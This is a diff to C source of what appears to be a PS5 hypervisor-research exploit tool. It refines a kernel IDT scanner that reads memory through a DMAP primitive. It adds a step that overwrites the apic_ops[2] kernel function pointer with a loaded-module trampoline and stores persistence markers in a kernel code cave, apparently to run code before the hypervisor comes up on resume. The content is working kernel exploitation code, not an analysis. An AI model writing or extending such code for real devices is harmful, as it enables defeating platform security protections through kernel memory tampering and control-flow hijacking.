@@ -1877,8 +1877,9 @@ static void campaign_kmod_kldload(void) {
                        best_run, sc_len);
                 printf("    Trying kdata region for code cave...\n");
 
-                /* Fallback: scan first 4MB of kdata for 0xCC or 0x00 runs */
-                for (uint64_t kva = g_kdata_base; kva < g_kdata_base + 0x400000; kva += 0x1000) {
+                /* Fallback: scan first 4MB of kdata for 0xCC or 0x00 runs.
+                 * Skip first page — reserved for Phase 7 persistence markers. */
+                for (uint64_t kva = g_kdata_base + 0x1000; kva < g_kdata_base + 0x400000; kva += 0x1000) {
                     uint64_t pa = va_to_pa_quiet(kva);
                     if (pa == 0) continue;
                     if (kernel_copyout(g_dmap_base + pa, kpage, 4096) != 0) continue;
@@ -2088,8 +2089,9 @@ ring3_fallback:
         fflush(stdout);
 
         /* 4d-3: IDT handler addresses
-         * SIDT is intercepted by PS5 HV (VMCB intercept bit) and kills
-         * the process.  Find IDT by scanning kdata via DMAP instead.
+         * On FW 4.03, SIDT works from ring 3 (not HV-intercepted).
+         * However, we scan kdata via DMAP as a fallback that also
+         * works on FW versions where SIDT may be intercepted.
          * (Direct kernel_copyout from KVA fails on many kdata pages;
          *  DMAP reads after page table walk always succeed.)
          *
@@ -2128,6 +2130,7 @@ ring3_fallback:
 
                 for (int boff = 0; boff <= 4096 - 16*8 && !idt_kva; boff += 16) {
                     int good = 0;
+                    int entry0_valid = 0;
                     uint16_t first_sel = 0;
                     for (int e = 0; e < 8; e++) {
                         uint8_t *g = &idt_pg[boff + e * 16];
@@ -2148,6 +2151,7 @@ ring3_fallback:
                             sel != 0 && sel <= 0x80 && (sel & 7) == 0 &&
                             rsv == 0) {
                             good++;
+                            if (e == 0) entry0_valid = 1;
                             if (first_sel == 0) first_sel = sel;
                         }
                     }
@@ -2155,7 +2159,11 @@ ring3_fallback:
                         best_run = good;
                         best_run_off = off + boff;
                     }
-                    if (good >= 6) {
+                    /* Require entry 0 (#DE) to be a valid gate.
+                     * Without this, the scanner can match 16 bytes
+                     * before the real IDT (entries 1-7 are real
+                     * entries 0-6, giving 7/8 valid but wrong base). */
+                    if (good >= 6 && entry0_valid) {
                         idt_kva = kva + boff;
                         idt_sel = first_sel;
                     }
@@ -4861,30 +4869,24 @@ static void campaign_flatz_setup(void) {
             notify("[HV Research] Phase 7: Post-resume check complete!");
 
         } else {
-            /* ─── Pre-suspend: set persistence markers only ─── */
-            printf("\n[*] Phase 7: Persistence markers (flatz method prep)\n\n");
+            /* ─── Pre-suspend: set markers + hook apic_ops[2] ─── */
+            printf("\n[*] Phase 7: apic_ops hook + persistence markers\n\n");
 
             /*
              * APPROACH:
              *   1. Save original xapic_mode in cave marker + QA flags
-             *   2. DO NOT hook apic_ops[2] yet — a bare "ret" causes
-             *      kernel panic during suspend (xapic_mode return value
-             *      is used by LAPIC shutdown sequence)
-             *   3. Enter rest mode with markers set
+             *   2. If KLD trampoline is available, hook apic_ops[2] →
+             *      trampoline_xapic_mode (SAFE: calls original via
+             *      g_trampoline_target, returns correct APIC mode)
+             *   3. Enter rest mode with hook armed
              *
              * CONFIRMED from previous tests:
              *   - Cave marker persists across suspend/resume
              *   - QA flags persist across suspend/resume
              *   - apic_ops[2] retains its value across resume
              *   - KASLR slide is stable across resume
-             *
-             * The full flatz method requires:
-             *   1. IDT #GP handler hook (via IST3 stack manipulation)
-             *   2. Pointer poisoning of apic_ops[2] (0xdeb7 prefix)
-             *   3. On resume: xapic_mode call → non-canonical → #GP
-             *   4. #GP handler runs our code before HV is up
-             *
-             * This phase just sets markers for persistence verification.
+             *   - KLD trampoline transparently calls original
+             *   - apic_ops writeback test passes from ring 0
              */
 
             uint64_t original_xapic = ops[2];
@@ -4908,7 +4910,7 @@ static void campaign_flatz_setup(void) {
              *   0x00: 8 bytes — magic  ("FLATZHOO")
              *   0x08: 8 bytes — original_xapic value
              *   0x10: 8 bytes — ktext_base (for KASLR verification)
-             *   0x18: 8 bytes — reserved for future hook target
+             *   0x18: 8 bytes — hook target (trampoline KVA or 0)
              */
             uint8_t marker_data[P7_MARKER_SIZE];
             memset(marker_data, 0, sizeof(marker_data));
@@ -4916,7 +4918,7 @@ static void campaign_flatz_setup(void) {
             memcpy(&marker_data[0x00], &cave_magic, 8);
             memcpy(&marker_data[0x08], &original_xapic, 8);
             memcpy(&marker_data[0x10], &g_ktext_base, 8);
-            /* 0x18 left as zero */
+            /* 0x18: filled below if trampoline hook is armed */
 
             /* Save original cave content */
             uint8_t cave_backup[P7_MARKER_SIZE];
@@ -4959,19 +4961,72 @@ static void campaign_flatz_setup(void) {
             printf("    QA marker: 0x%08x [%s]\n", mv,
                    mv == PHASE7_MARKER ? "OK" : "FAIL");
 
+            /* ── Step 3: Hook apic_ops[2] with KLD trampoline ── */
+            int hook_armed = 0;
+            if (g_kmod_trampoline_func && g_kmod_trampoline_target) {
+                printf("\n[*] Step 3: Hooking apic_ops[2] → KLD trampoline...\n");
+                printf("    trampoline_xapic_mode() = 0x%016lx\n",
+                       (unsigned long)g_kmod_trampoline_func);
+                printf("    g_trampoline_target     = 0x%016lx\n",
+                       (unsigned long)g_kmod_trampoline_target);
+
+                /* Write original xapic_mode to g_trampoline_target via DMAP
+                 * so the trampoline calls through to the real function. */
+                uint64_t target_pa = va_to_pa_quiet(g_kmod_trampoline_target);
+                if (target_pa) {
+                    kernel_copyin(&original_xapic,
+                                  g_dmap_base + target_pa, 8);
+                    /* Verify */
+                    uint64_t target_verify = 0;
+                    kernel_copyout(g_dmap_base + target_pa, &target_verify, 8);
+                    printf("    Trampoline target set: 0x%016lx [%s]\n",
+                           (unsigned long)target_verify,
+                           target_verify == original_xapic ? "OK" : "FAIL");
+                } else {
+                    printf("[-] g_trampoline_target VA→PA failed.\n");
+                }
+
+                /* Write trampoline KVA into apic_ops[2] */
+                kernel_copyin(&g_kmod_trampoline_func,
+                              g_dmap_base + ops_pa + 0x10, 8);
+
+                /* Verify the hook */
+                uint64_t hook_verify = 0;
+                kernel_copyout(g_dmap_base + ops_pa + 0x10, &hook_verify, 8);
+                hook_armed = (hook_verify == g_kmod_trampoline_func);
+                printf("    apic_ops[2] hooked: 0x%016lx [%s]\n",
+                       (unsigned long)hook_verify,
+                       hook_armed ? "OK" : "FAIL");
+
+                if (hook_armed) {
+                    /* Store hook target in cave marker offset 0x18 */
+                    kernel_copyin(&g_kmod_trampoline_func,
+                                  g_dmap_base + cave_pa + 0x18, 8);
+                }
+            } else {
+                printf("\n[*] Step 3: KLD trampoline not available — skipping hook.\n");
+                printf("    trampoline_func:   0x%lx\n",
+                       (unsigned long)g_kmod_trampoline_func);
+                printf("    trampoline_target: 0x%lx\n",
+                       (unsigned long)g_kmod_trampoline_target);
+            }
+
             printf("\n[+] ============================================\n");
-            printf("[+]  PERSISTENCE MARKERS SET\n");
+            printf("[+]  PHASE 7 PRE-SUSPEND SETUP COMPLETE\n");
             printf("[+] ============================================\n");
             printf("[+]\n");
             printf("[+] What was set:\n");
             printf("[+]   Cave marker:    FLATZHOO + original xapic\n");
-            printf("[+]   QA flags:       Phase 7 marker\n");
-            printf("[+]   apic_ops[2]:    UNCHANGED (0x%016lx)\n",
-                   (unsigned long)original_xapic);
-            printf("[+]\n");
-            printf("[+] NOTE: nop_ret hook REMOVED — bare 'ret' causes\n");
-            printf("[+]   kernel panic during suspend (LAPIC shutdown needs\n");
-            printf("[+]   valid xapic_mode return value).\n");
+            printf("[+]   QA flags:       Phase 7 marker + original xapic\n");
+            if (hook_armed) {
+                printf("[+]   apic_ops[2]:    HOOKED → KLD trampoline\n");
+                printf("[+]     trampoline calls original xapic_mode\n");
+                printf("[+]     Returns correct APIC mode — safe for suspend\n");
+            } else {
+                printf("[+]   apic_ops[2]:    UNCHANGED (0x%016lx)\n",
+                       (unsigned long)original_xapic);
+                printf("[+]     KLD trampoline unavailable — hook not armed\n");
+            }
             printf("[+]\n");
             printf("[+] CONFIRMED from previous tests:\n");
             printf("[+]   - Cave marker persists across resume\n");
@@ -4979,12 +5034,19 @@ static void campaign_flatz_setup(void) {
             printf("[+]   - apic_ops[2] retains value across resume\n");
             printf("[+]   - KASLR slide stable across resume\n");
             printf("[+]\n");
-            printf("[+] NEXT: Implement full flatz method:\n");
-            printf("[+]   1. Hook IDT #GP via IST3 stack\n");
-            printf("[+]   2. Poison apic_ops[2] with 0xdeb7 prefix\n");
-            printf("[+]   3. On resume: #GP → our code runs pre-HV\n");
+            if (hook_armed) {
+                printf("[+] ACTION: Enter REST MODE now!\n");
+                printf("[+]   On resume: cpususpend_handler calls xapic_mode\n");
+                printf("[+]   → KLD trampoline → original → returns normally\n");
+                printf("[+]   Wake → re-exploit → re-run tool → check results\n");
+            } else {
+                printf("[+] NOTE: Hook not armed. Enter REST MODE to test\n");
+                printf("[+]   persistence markers only.\n");
+            }
 
-            notify("[HV Research] Phase 7: Markers set. Enter REST MODE!");
+            notify(hook_armed
+                   ? "[HV Research] Phase 7: HOOK ARMED! Enter REST MODE!"
+                   : "[HV Research] Phase 7: Markers set. Enter REST MODE!");
         }
 
         /* ─── Phase 8: IDT + kstuff offset verification ───
